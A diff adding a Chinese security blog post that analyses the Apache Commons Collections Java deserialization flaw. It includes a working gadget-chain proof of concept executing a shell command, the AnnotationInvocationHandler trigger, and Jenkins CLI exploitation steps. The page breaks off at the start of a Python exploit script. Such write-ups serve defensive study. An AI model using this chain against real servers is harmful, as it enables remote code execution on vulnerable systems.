@@ -1,0 +1,639 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Commons Collections Java反序列化漏洞深入分析 &#8211; KINGX</title>
+<meta name="description" content="">
+<meta name="keywords" content="java, unserialize, exploit">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kingx.me/images/">
+<meta name="twitter:title" content="Commons Collections Java反序列化漏洞深入分析">
+<meta name="twitter:description" content="">
+<meta name="twitter:creator" content="@https://example.com">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons Collections Java反序列化漏洞深入分析">
+<meta property="og:description" content="">
+<meta property="og:url" content="https://kingx.me/commons-collections-java-deserialization.html">
+<meta property="og:site_name" content="KINGX">
+
+
+
+
+
+<link rel="canonical" href="https://kingx.me/commons-collections-java-deserialization.html">
+<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>
+
+
+</head>
+
+<body id="post" >
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://kingx.me/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
+					<h4>KINGX</h4>
+					<p>What is Security</p>
+				</li>
+				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				<li>
+					<a href="http://example.com"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<!-- <li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://kingx.me/posts/">All Posts</a></li>
+				<li><a href="https://kingx.me/tags/">All Tags</a></li>
+			</ul>
+		</li> -->
+		
+	    
+	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/links/" >Links</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://kingx.me/commons-collections-java-deserialization.html" rel="bookmark" title="Commons Collections Java反序列化漏洞深入分析">Commons Collections Java反序列化漏洞深入分析</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2015-11-20T00:00:00-05:00">November 20, 2015</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~4 minutes
+          
+          <span id="busuanzi_container_page_pv">
+             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
+          </span>
+          
+        </p><!-- /.entry-reading-time -->
+        
+
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
+      <p><em>本文中涉及到的相关漏洞为官方已经公开的漏洞并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</em></p>
+
+<h2 id="0x01-背景">0x01 背景</h2>
+
+<p>今年公开的Java相关漏洞中，影响力最大的莫过于这段时间持续火热的Commons Collections反序列化漏洞了。</p>
+
+<p>在2015年11月6日FoxGlove Security安全团队的<code class="highlighter-rouge">@breenmachine</code> 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。<strong>而在将近10个月前</strong>， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。</p>
+
+<p>目前，针对这个“2015年最被低估”的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。</p>
+
+<h2 id="0x02-从apache-commons-collections-说起">0x02 从Apache Commons Collections 说起</h2>
+
+<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+
+<p>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
+
+<p>我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例。</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">Map</span> <span class="n">tansformedMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">valueTransformer</span><span class="o">);</span></code></pre></figure>
+
+<p>当TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。而Apache Commons Collections已经内置了一些常用的Transformer，其中InvokerTransformer类就是今天的主角。</p>
+
+<p>它的transform方法如下：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+        <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">input</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
+
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchMethodException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">FunctorException</span><span class="o">(</span><span class="s">"InvokerTransformer: The method '"</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">"' on '"</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">"' does not exist"</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">FunctorException</span><span class="o">(</span><span class="s">"InvokerTransformer: The method '"</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">"' on '"</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">"' cannot be accessed"</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">FunctorException</span><span class="o">(</span><span class="s">"InvokerTransformer: The method '"</span> <span class="o">+</span> <span class="n">iMethodName</span> <span class="o">+</span> <span class="s">"' on '"</span> <span class="o">+</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">"' threw an exception"</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>这个transform(Object input) 中使用Java反射机制调用了input对象的一个方法，而该方法名是实例化InvokerTransformer类时传入的iMethodName成员变量：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="n">Transformer</span> <span class="nf">getInstance</span><span class="o">(</span><span class="n">String</span> <span class="n">methodName</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalArgumentException</span><span class="o">(</span><span class="s">"The method to invoke must not be null"</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="n">methodName</span><span class="o">);</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>也就是说这段反射代码中的调用的方法名和Class对象均可控。于是，我们可以构造一个恶意的Transformer链，借用InvokerTransformer.transform()执行任意命令，测试代码如下：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonTest</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="o">{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
+                        <span class="n">Class</span><span class="o">[].</span><span class="na">class</span> <span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="s">"getRuntime"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
+                        <span class="n">Object</span><span class="o">[].</span><span class="na">class</span> <span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span> <span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="s">"touch /tmp/commontest"</span> <span class="o">})</span> <span class="o">};</span>
+
+        <span class="n">Transformer</span> <span class="n">transformedChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="n">Map</span> <span class="n">normalMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">normalMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span> <span class="s">"value"</span><span class="o">);</span>
+
+        <span class="n">Map</span> <span class="n">tansformedMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">normalMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">transformedChain</span><span class="o">);</span>
+
+        <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">)</span> <span class="n">transformedMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">();</span>
+        <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="s">"test"</span><span class="o">);</span>
+
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>以上代码中ConstantTransformer也是Commons Collections内置的一个Transformer，顾名思义可以将待变换的对象，变为一个常量，它的transform()方法代码如下：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">iConstant</span><span class="o">;</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="o">((</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">)).</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch /tmp/commontest"</span><span class="o">);</span></code></pre></figure>
+
+<p>也就是说，一个精心构造的TransformedMap，在其任意键值被修改时，可以触发变换，从而执行任意命令。</p>
+
+<p>那如何进行远程命令执行的利用呢？</p>
+
+<h2 id="0x03-使用java反序列化实现rce">0x03 使用Java反序列化实现RCE</h2>
+
+<p>Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。很多Java应用会使用序列化的方式传递数据，应用程序接收用户传入的一个字节序列，将其反序列化恢复为Java对象。</p>
+
+<p>这里，如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的<code class="highlighter-rouge">TransformedMap</code>序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？</p>
+
+<p>在进行反序列化时，我们会调用<code class="highlighter-rouge">ObjectInputStream</code>类的<code class="highlighter-rouge">readObject()</code>方法。如果被反序列化的类重写了<code class="highlighter-rouge">readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code class="highlighter-rouge">readObject()</code>方法。</p>
+
+<p>结合前述Commons Collections的特性，如果某个可序列化的类重写了<code class="highlighter-rouge">readObject()</code>方法，并且在<code class="highlighter-rouge">readObject()</code>中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
+
+<p>于是找到了这个类：<code class="highlighter-rouge">AnnotationInvocationHandler</code>。该类的代码如下：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">class</span> <span class="nc">AnnotationInvocationHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">6182022883658399397L</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">;</span>
+
+<span class="n">AnnotationInvocationHandler</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">superInterfaces</span> <span class="o">=</span> <span class="n">type</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">type</span><span class="o">.</span><span class="na">isAnnotation</span><span class="o">()</span> <span class="o">||</span>
+            <span class="n">superInterfaces</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span>
+            <span class="n">superInterfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Annotation</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">AnnotationFormatError</span><span class="o">(</span><span class="s">"Attempt to create proxy for a non-annotation type."</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">type</span> <span class="o">=</span> <span class="n">type</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span> <span class="o">=</span> <span class="n">memberValues</span><span class="o">;</span>
+    <span class="o">}</span>
+
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+
+        <span class="c1">// Check to make sure that types have not evolved incompatibly</span>
+
+        <span class="n">AnnotationType</span> <span class="n">annotationType</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">annotationType</span> <span class="o">=</span> <span class="n">AnnotationType</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">IllegalArgumentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">// Class is no longer an annotation type; time to punch out</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">InvalidObjectException</span><span class="o">(</span><span class="s">"Non-annotation type in annotation serial stream"</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;&gt;</span> <span class="n">memberTypes</span> <span class="o">=</span> <span class="n">annotationType</span><span class="o">.</span><span class="na">memberTypes</span><span class="o">();</span>
+
+        <span class="c1">// If there are annotation members without values, that</span>
+        <span class="c1">// situation is handled by the invoke method.</span>
+        <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValue</span> <span class="o">:</span> <span class="n">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
+            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">memberType</span> <span class="o">=</span> <span class="n">memberTypes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">memberType</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// i.e. member still exists</span>
+                <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(!(</span><span class="n">memberType</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">value</span><span class="o">)</span> <span class="o">||</span>
+                      <span class="n">value</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">memberValue</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span>
+                        <span class="k">new</span> <span class="nf">AnnotationTypeMismatchExceptionProxy</span><span class="o">(</span>
+                            <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">"["</span> <span class="o">+</span> <span class="n">value</span> <span class="o">+</span> <span class="s">"]"</span><span class="o">).</span><span class="na">setMember</span><span class="o">(</span>
+                                <span class="n">annotationType</span><span class="o">.</span><span class="na">members</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)));</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>简直完美。它的成员变量memberValue为Map&lt;String, Object&gt; 类型，并且在重写的<code class="highlighter-rouge">readObject()</code>方法中有<code class="highlighter-rouge">memberValue.setValue()</code>的操作。</p>
+
+<p>我们可以实例化一个<code class="highlighter-rouge">AnnotationInvocationHandler</code>类，将其成员变量<code class="highlighter-rouge">memberValues</code>赋值为精心构造的恶意<code class="highlighter-rouge">TransformedMap</code>对象。然后将其序列化，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发<code class="highlighter-rouge">TransformedMap</code>的变换函数，执行预设的命令。</p>
+
+<h2 id="0x04-jenkins利用详细分析">0x04 Jenkins利用详细分析</h2>
+
+<p>想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。</p>
+
+<p>从流量上分析，java序列化的数据为以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。从代码上分析，可以关注<code class="highlighter-rouge">readObject()</code>方法的使用点。</p>
+
+<p>在<foxglovesecurity.com>发布的文章中，受影响的Java应用程序就已经包括了WebLogic, WebSphere, JBoss, Jenkins, OpenNMS等等。foxglovesec也在GitHub上给出了各受影响应用的Expoit：&lt;https://github.com/foxglovesec&gt;</foxglovesecurity.com></p>
+
+<p>以Jenkins为例，Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的<code class="highlighter-rouge">WEB-INF/jenkins-cli.jar</code>程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。</p>
+
+<p>于是我们可以将数据包中Base64编码的序列化数据 替换为我们构造的恶意数据，发送到Jenkins服务端，实现远程命令执行。</p>
+
+<p>直接使用wireshark抓取这段通信包时，会发现它是经过SSL加密的密文数据。</p>
+
+<p>分析数据包发现，jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。</p>
+
+<p>如果未解析到<code class="highlighter-rouge">X-Jenkins-CLI2-Port</code>头，则会解析<code class="highlighter-rouge">X-Jenkins-CLI-Port</code>头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。
+于是，我们可以通过BurpSuit来篡改通信中的HTTP响应包，删除<code class="highlighter-rouge">X-Jenkins-CLI2-Port</code>响应头，从而使wireshark可以抓到明文数据包。
+设置命令行终端的HTTP代理，一般可以使用环境变量<code class="highlighter-rouge">http_proxy</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">export </span><span class="nv">http_proxy</span><span class="o">=</span>http://proxyaddress:port</code></pre></figure>
+
+<p>这里对于Java程序，需要_JAVA_OPTIONS进行设置</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">export </span><span class="nv">_JAVA_OPTIONS</span><span class="o">=</span><span class="s1">'-Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080'</span></code></pre></figure>
+
+<p>再执行jenkins-cli.jar，篡改数据包后，即可使用wireshark抓到明文的Jenkins-CLI通信包。</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> http://x.x.x.x:8888/</code></pre></figure>
+
+<p><code class="highlighter-rouge">@breenmachine</code>给出的完整的利用脚本如下：</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span>
+<span class="c1">#usage: ./jenkins.py host port /path/to/payload
+</span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="c1">#Query Jenkins over HTTP to find what port the CLI listener is on
